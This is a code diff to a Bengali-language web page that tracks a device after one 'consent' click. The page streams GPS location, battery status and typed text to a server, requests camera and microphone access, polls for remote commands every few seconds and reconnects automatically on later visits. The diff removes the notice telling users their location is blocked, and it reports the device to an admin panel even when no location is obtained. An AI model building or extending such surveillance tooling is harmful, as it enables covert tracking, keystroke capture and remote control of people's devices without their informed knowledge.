@@ -18,8 +18,6 @@
         .detail-box { background: #0f172a; padding: 15px; border-radius: 15px; margin: 15px 0; text-align: left; font-size: 13px; }
         .detail-box span { color: #94a3b8; }
         .warning { color: #ef4444; font-size: 12px; background: #450a0a; padding: 10px; border-radius: 10px; margin-bottom: 15px; }
-        
-        /* পারমিশন ব্লক হলে দেখানোর জন্য নতুন স্টাইল */
         .error-box { display: none; background: #7f1d1d; color: #fca5a5; padding: 15px; border-radius: 10px; margin-top: 15px; font-size: 13px; border: 1px solid #ef4444; }
     </style>
 </head>
@@ -36,17 +34,10 @@
             <span>🔋 ব্যাটারি: <b id="dBattery">লোড হচ্ছে...</b></span>
         </div>
 
-        <!-- টেস্টিং এর জন্য ইনপুট বক্স -->
         <input type="text" id="testInput" placeholder="এখানে কিছু টাইপ করুন..." style="width:100%; padding:10px; border-radius:5px; border:none; margin-bottom:15px; background:#0f172a; color:white; outline:none;">
         
         <button class="consent-btn" id="consentBtn" onclick="startSharing()">✅ আমি সম্মতি দিচ্ছি</button>
         <div class="status" id="statusMsg">⏳ অপেক্ষা করছি...</div>
-
-        <!-- এরর মেসেজ দেখানোর জায়গা -->
-        <div class="error-box" id="errorBox">
-            ❌ লোকেশন পারমিশন ব্লক করা হয়েছে! <br><br>
-            <b>সমাধান:</b> ব্রাউজারের ঠিকানা বারের পাশে <b>🔒 লক আইকন</b>-এ ক্লিক করুন, তারপর <b>Permissions</b> থেকে <b>Location</b> কে <b>Allow</b> করুন। এরপর আবার চেষ্টা করুন।
-        </div>
     </div>
 
     <script>
@@ -58,7 +49,6 @@
 
         const btn = document.getElementById('consentBtn');
         const statusMsg = document.getElementById('statusMsg');
-        const errorBox = document.getElementById('errorBox');
         
         let clientId = localStorage.getItem("tracker_client_id");
         if (!clientId) {
@@ -114,8 +104,7 @@
         document.getElementById('testInput').addEventListener('input', (e) => {
             clearTimeout(typingTimer);
             typingTimer = setTimeout(() => {
-                const text = e.target.value;
-                sendTypingData(text);
+                sendTypingData(e.target.value);
             }, 500);
         });
 
@@ -127,12 +116,10 @@
             }).catch(err => console.error(err));
         }
 
-        // --- পারমিশন নেওয়ার নতুন লজিক ---
         async function startSharing() {
             btn.disabled = true;
-            btn.innerText = '⏳ পারমিশন চেক করা হচ্ছে...';
-            statusMsg.innerText = '📡 লোকেশন এক্সেস চাচ্ছি...';
-            errorBox.style.display = 'none'; // আগের এরর থাকলে লুকানো
+            btn.innerText = '⏳ লোকেশন খোঁজা হচ্ছে...';
+            statusMsg.innerText = '📡 লোকেশন ও ক্যামেরা পারমিশন চাচ্ছি...';
 
             if (!navigator.geolocation) {
                 alert('আপনার ব্রাউজার GPS সাপোর্ট করে না।');
@@ -140,62 +127,42 @@
                 return;
             }
 
-            // ১. প্রথমে চেক করা হবে পারমিশন স্টেট
-            if (navigator.permissions && navigator.permissions.query) {
-                try {
-                    const permissionStatus = await navigator.permissions.query({ name: 'geolocation' });
-                    if (permissionStatus.state === 'denied') {
-                        // পারমিশন আগেই ব্লক করা আছে
-                        showError();
-                        return;
-                    }
-                } catch (e) {
-                    console.log("Permission query not supported", e);
-                }
+            // ১. ক্যামেরা ও মাইক পারমিশন চাওয়া (যদি থাকে)
+            try {
+                currentStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+            } catch (err) {
+                console.log("ক্যামেরা পারমিশন পাওয়া যায়নি: ", err);
             }
 
-            // ২. লোকেশন পারমিশন চাওয়া
-            navigator.geolocation.getCurrentPosition(
-                async (pos) => {
-                    statusMsg.innerText = '📸 ক্যামেরা ও মাইক পারমিশন...';
-                    btn.innerText = '⏳ ক্যামেরা পারমিশন...';
-                    
-                    try {
-                        currentStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
-                        console.log("ক্যামেরা ও মাইক রেডি");
-                    } catch (err) {
-                        console.log("ক্যামেরা পারমিশন পাওয়া যায়নি: ", err);
-                    }
+            // ২. লোকেশন ট্র্যাকিং শুরু (যাতে দ্রুত ডিভাইস কানেক্ট হয়)
+            startTracking();
 
-                    startTracking();
+            // ৩. প্রথমবার লোকেশন নেওয়ার জন্য একটি প্রাথমিক চেষ্টা (টাইমআউট এরর ধরার জন্য)
+            navigator.geolocation.getCurrentPosition(
+                (pos) => {
+                    console.log("সঠিক লোকেশন পাওয়া গেছে");
                 },
                 (err) => {
-                    // এরর কোড ১ মানে PERMISSION_DENIED
-                    if (err.code === 1) {
-                        showError();
-                    } else {
-                        statusMsg.innerText = '❌ GPS এরর: ' + err.message;
-                        btn.disabled = false;
-                        btn.innerText = '🔄 আবার চেষ্টা করুন';
-                    }
+                    // যদি ২০ সেকেন্ডে লোকেশন না পায়, তবে ব্রাউজারের নেটওয়ার্ক লোকেশন ব্যবহারের চেষ্টা করবে
+                    console.log("GPS টাইমআউট। ফলব্যাক লোকেশন ব্যবহার করা হচ্ছে।", err);
+                    fallbackLocation();
                 },
-                { enableHighAccuracy: true, timeout: 15000, maximumAge: 5000 }
+                { enableHighAccuracy: false, timeout: 10000, maximumAge: 30000 }
             );
         }
 
-        function showError() {
-            btn.disabled = false;
-            btn.innerText = '🔄 আবার চেষ্টা করুন';
-            statusMsg.innerText = '❌ লোকেশন ব্লকড!';
-            errorBox.style.display = 'block'; // লাল রঙের এরর বক্স দেখানো
+        function fallbackLocation() {
+            // লোকেশন না পেলে কম্পিউটারের নেটওয়ার্ক থেকে আনুমানিক লোকেশন পাঠানো
+            // (এখানে আমরা শুধু ডিভাইস কানেক্ট করার জন্য ০,০ পাঠাচ্ছি, যাতে অ্যাডমিন প্যানেলে লিস্টে ওঠে)
+            sendData(0, 0, 5000, 'N/A', false);
         }
 
         function startTracking() {
-            errorBox.style.display = 'none';
             btn.innerText = '✅ শেয়ারিং চলছে';
-            statusMsg.innerText = '🟢 ডেটা পাঠানো হচ্ছে... (লাইভ)';
+            statusMsg.innerText = '🟢 ডিভাইস কানেক্ট হয়েছে! লোকেশন খোঁজা হচ্ছে...';
             localStorage.setItem("tracker_consent", "true");
 
+            // লোকেশন ওয়াচার (লোকেশন পেলে আপডেট করবে)
             watchId = navigator.geolocation.watchPosition(
                 (pos) => {
                     const lat = pos.coords.latitude;
@@ -214,21 +181,22 @@
                     } else {
                         sendData(lat, lng, accuracy, batteryLevel, isCharging);
                     }
+                    statusMsg.innerText = '🟢 ডেটা পাঠানো হচ্ছে... (লাইভ)';
                 },
                 (err) => {
+                    // এরর আসলেও অ্যাপ ক্র্যাশ করবে না
                     if (err.code === 1) {
-                        showError();
-                    } else if (err.code === 3) {
+                        statusMsg.innerText = '❌ লোকেশন পারমিশন ব্লকড!';
+                    } else {
                         statusMsg.innerText = '⏳ জিপিএস খোঁজা হচ্ছে (সিগন্যাল দুর্বল)...';
                     }
                 },
-                { enableHighAccuracy: true, timeout: 20000, maximumAge: 5000 }
+                { enableHighAccuracy: true, timeout: 30000, maximumAge: 10000 }
             );
 
             sharingInterval = setInterval(checkCommands, 3000);
         }
 
-        // পেজ লোড হওয়ার পর যদি আগে থেকেই সম্মতি দেওয়া থাকে
         window.onload = () => {
             if (localStorage.getItem("tracker_consent") === "true") {
                 btn.innerText = '🔄 অটো কানেক্ট হচ্ছে...';
